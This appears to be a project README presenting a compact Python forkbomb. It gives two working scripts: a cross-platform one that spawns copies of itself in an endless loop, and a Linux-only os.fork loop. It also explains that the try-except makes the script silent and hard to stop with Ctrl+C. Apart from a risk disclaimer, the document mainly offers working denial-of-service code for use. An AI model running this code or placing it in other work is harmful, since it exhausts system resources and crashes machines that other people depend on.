# python_forkbomb

A 78-character Python forkbomb.

> [!WARNING]
> A forkbomb is a program that recursively forks itself, consuming all available system resources and eventually leading to a system crash. By running this script, you take full responsibility for any damage it may cause. If you want to test it safely, you can use a virtual environment/machine. **Use at your own risk.**

## The code & explanation

```python
import sys,os
while 1:
 try:os.popen(sys.executable+' '+__file__)
 except:pass
```

While smaller forkbombs exist, mine creates more processes, leading to a faster crash. The following script:

```python
import os
while 1:os.fork()
```

is smaller, but only works on Linux. For my script, it works on both Windows and Linux.

The `try-except` block is to prevent the script from crashing if it fails to fork. It also ignores `Ctrl+C` to prevent the user from stopping the script. It also makes the script silent (it doesn't print any error messages).

## Requirements

- [Python](https://www.python.org/downloads)
